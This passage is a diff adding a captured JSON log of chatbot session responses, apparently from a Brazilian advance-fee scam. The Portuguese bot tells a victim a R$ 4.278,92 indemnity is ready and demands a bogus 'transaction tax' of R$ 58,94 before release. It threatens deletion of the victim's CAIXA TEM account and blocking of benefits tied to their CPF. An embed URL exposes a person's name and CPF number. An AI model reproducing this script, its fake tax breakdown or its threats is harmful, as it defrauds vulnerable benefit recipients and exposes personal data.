+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave pix informada."
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Iremos gerar o comprovante do valor de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 4.278,92 "
+                    },
+                    {
+                      "text": "neste instante."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "m3z7f22mdcmynxsssce78u0w",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "swkqmhyar8sjxihvvq033ajv",
+              "content": "Confirmar e gerar comprovante de recebimento"
+            }
+          ]
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 1
+            }
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "efp1o7enloqmfuuxlxqz2kv8"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "f3sc8prheptpbgchvd01mv9e"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "ewm8wmpgq16vevb46qeyca1l"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 5
+            },
+            "lastBubbleBlockId": "go679p49zmrsk056izjq08wu"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:30:24.301Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "j011yu91b0v5ucrtkihq5x3j",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Gerando seu comprovante de recebimento dos valores..."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "ys44clfbxgqe0lm1bhke6jzb",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": " ✅ Comprovante gerado com sucesso!"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "kyx4ali5l7sgymc9de6gm09x",
+            "type": "embed",
+            "content": {
+              "url": "https://embeds-azul.lsnuat.easypanel.host/embed-03/?name=Jose Nilton Dourado Da Silva&document=19777892349&pix=19777892349",
+              "height": 620
+            }
+          },
+          {
+            "id": "m3rzqqel2upbz56vi471mfnz",
+            "type": "embed",
+            "content": {
+              "url": "https://confirmado-pagamentooficiais.com/audio.html?avatar=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/f4wz5b9q7cwynjzk6daw9cef?v=1758995831637?v=1758992866341?v=1755759669312&bg=%230764ad&ring=%23e6f2f4&accent=%23ffffff&src=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/q1no8il0m2r0s6qkmbrhsqi3?v=1758992439202",
+              "height": 140
+            }
+          },
+          {
+            "id": "z27h88p41edegar2dt9b84ya",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "O "
+                    },
+                    {
+                      "bold": true,
+                      "text": "CÁLCULO"
+                    },
+                    {
+                      "text": " do valor total do "
+                    },
+                    {
+                      "bold": true,
+                      "text": "IMPOSTO"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "bold": true,
+                      "text": "TRANSACIONAL"
+                    },
+                    {
+                      "text": " é feito sobre o valor que você tem disponível para receber "
+                    },
+                    {
+                      "bold": true,
+                      "text": "(R$4.278,92)."
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Imposto Transacional: "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 17,22"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Contribuição Federal: "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 20,21"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Imposto de Saque: "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "bold": true,
+                      "text": "21,51"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Total do Imposto: "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 58,94"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "znu8gt4xcvl19i4zijfx2we0",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "✅ Finalize agora o "
+                    },
+                    {
+                      "bold": true,
+                      "text": "pagamento"
+                    },
+                    {
+                      "text": " do Imposto e receba sua indenização no "
+                    },
+                    {
+                      "bold": true,
+                      "text": "mesmo"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "bold": true,
+                      "text": "minuto"
+                    },
+                    {
+                      "text": "!"
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "ctd9q4qpmqvz82guhdwn4kwm",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "u80oyedqi396y9xul4afqlxg",
+              "outgoingEdgeId": "ve2slqxx2yennb1uxoyd6gws",
+              "content": "Por que tenho que pagar esse imposto?"
+            }
+          ]
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 1
+            }
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "j011yu91b0v5ucrtkihq5x3j"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 12
+            },
+            "lastBubbleBlockId": "kyx4ali5l7sgymc9de6gm09x"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 55
+            },
+            "lastBubbleBlockId": "m3rzqqel2upbz56vi471mfnz"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 1
+            },
+            "lastBubbleBlockId": "z27h88p41edegar2dt9b84ya"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:31:12.128Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "iua27bgsv1ggn33r1wms46pz",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "O valor de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 4.278,92"
+                    },
+                    {
+                      "text": " já foi aprovado e está vinculado exclusivamente ao seu CPF. Por questões de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "SEGURANÇA JURÍDICA"
+                    },
+                    {
+                      "text": " e "
+                    },
+                    {
+                      "bold": true,
+                      "text": "PROTEÇÃO DE DADOS"
+                    },
+                    {
+                      "text": ", nenhum valor pode ser descontado diretamente da sua indenização."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "bdvp5tpkidoj26xj0p4o4ssq",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Por isso, o "
+                    },
+                    {
+                      "bold": true,
+                      "text": "IMPOSTO TRANSACIONAL"
+                    },
+                    {
+                      "text": " deve ser pago separadamente, antes da liberação do saque. O valor do imposto, é equivalente aos  custos gerados e encargos jurídicos referente a sua indenizacão."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "hr4qvrlp1r4ilxg5fjgokclu",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Você receberá o seu valor de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 4.278,92"
+                    },
+                    {
+                      "text": " no mesmo segundo após"
+                    },
+                    {
+                      "bold": true,
+                      "text": " "
+                    },
+                    {
+                      "text": "a"
+                    },
+                    {
+                      "bold": true,
+                      "text": " CONFIRMAÇÃO "
+                    },
+                    {
+                      "text": "do"
+                    },
+                    {
+                      "bold": true,
+                      "text": " PAGAMENTO."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "mjgxo5m5c16l66qxzm9w4w0s",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "⚠️"
+                    },
+                    {
+                      "text": " Em casos de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "DESISTÊNCIA"
+                    },
+                    {
+                      "text": " do seu recebimento, resultará"
+                    },
+                    {
+                      "bold": true,
+                      "text": " "
+                    },
+                    {
+                      "text": "em"
+                    },
+                    {
+                      "bold": true,
+                      "text": " CANCELAMENTO "
+                    },
+                    {
+                      "text": "do seu valor disponível"
+                    },
+                    {
+                      "bold": true,
+                      "text": " "
+                    },
+                    {
+                      "text": "e exclusão da sua conta "
+                    },
+                    {
+                      "bold": true,
+                      "text": "CAIXA TEM"
+                    },
+                    {
+                      "text": "."
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "⚠️"
+                    },
+                    {
+                      "text": " Causando o "
+                    },
+                    {
+                      "bold": true,
+                      "text": "BLOQUEIO "
+                    },
+                    {
+                      "text": "dos"
+                    },
+                    {
+                      "bold": true,
+                      "text": " BENEFÍCIOS "
+                    },
+                    {
+                      "text": "vinculados ao seu CPF."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "kgpv6i948xmasdjdd5pqoj83",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "✔️ Efetue o pagamento do Imposto e receba "
+                    },
+                    {
+                      "bold": true,
+                      "text": "AGORA"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "bold": true,
+                      "text": "MESMO "
+                    },
+                    {
+                      "text": "o seu benefício."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "zfelzscg2l1mz3520c3kn7df",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "jwhh6ckixbkerxajzu0u29sq",
+              "outgoingEdgeId": "ug9qm4z79f8fvh5q1v4re090",
+              "content": "Concluir pagamento e receber minha indenização"
+            }
+          ]
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 5
+            },
+            "lastBubbleBlockId": "iua27bgsv1ggn33r1wms46pz"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 5
+            },
+            "lastBubbleBlockId": "bdvp5tpkidoj26xj0p4o4ssq"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 4
+            },
+            "lastBubbleBlockId": "hr4qvrlp1r4ilxg5fjgokclu"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 7
+            },
+            "lastBubbleBlockId": "mjgxo5m5c16l66qxzm9w4w0s"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 4
+            },
+            "lastBubbleBlockId": "kgpv6i948xmasdjdd5pqoj83"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:32:40.875Z"
+    }
+  ],
+  "responses": [],
+  "typebot": null
+}
